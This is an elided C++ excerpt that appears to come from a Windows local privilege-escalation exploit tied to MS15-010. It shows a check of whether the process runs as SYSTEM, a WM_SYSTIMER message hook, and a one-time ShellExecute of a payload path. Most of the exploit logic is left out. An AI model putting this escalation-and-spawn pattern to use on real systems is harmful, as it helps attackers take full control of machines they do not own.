...
BOOL IsElevated()
{
	...
	if (wstring(username) == "SYSTEM" || wstring(username) == "System" || wstring(username) == "system" || wstring(username) == "Local System" || wstring(username) == "LOCALSYSTEM" || wstring(username) == "LocalSystem" || wstring(username) == "localsystem" || wstring(username) == "система" || wstring(username) == "Система" || wstring(username) == "СИСТЕМА")
		return true;
	else
		return false;
	...
	DWORD cbSize = sizeof(TOKEN_OWNER);
	GetTokenInformation(hToken, TokenOwner, (LPVOID*)&token_owner, sizeof(token_owner), &cbSize);
			...
			if (Msg.message == WM_SYSTIMER) // Borrowed from http://blog.beyondtrust.com/fuzzing-for-ms15-010
			{
				...
				else
				{
					...
					if (!bSpawned)
					{
						...
						ShellExecute(NULL, TEXT("open"), full_path, NULL, NULL, SW_SHOW);
						bSpawned = TRUE;
					}
				}
			}
